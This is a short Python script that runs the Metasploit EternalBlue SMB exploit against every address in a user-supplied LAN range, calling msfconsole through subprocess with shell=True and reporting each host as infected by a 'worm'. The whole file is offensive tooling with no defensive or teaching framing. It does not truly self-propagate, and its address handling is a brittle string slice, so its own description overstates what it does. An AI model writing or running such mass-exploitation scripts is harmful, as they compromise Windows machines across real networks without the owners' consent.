import os
import subprocess

def spread_worm():
    # Get the IP range of the LAN
    ip_range = input("Enter the IP range of the LAN (e.g., 192.168.0.0/24): ")

    # Generate a list of IP addresses in the LAN
    ip_list = []
    for i in range(1, 255):
        ip = ip_range[:-4] + str(i)
        ip_list.append(ip)

    # Spread the worm to each IP address in the LAN
    for ip in ip_list:
        try:
            # Use Metasploit to exploit the target device
            exploit_command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; exploit'"
            subprocess.run(exploit_command, shell=True, check=True)
            print(f"Worm successfully spread to {ip}")
        except subprocess.CalledProcessError:
            print(f"Failed to spread worm to {ip}")

if __name__ == "__main__":
    spread_worm()
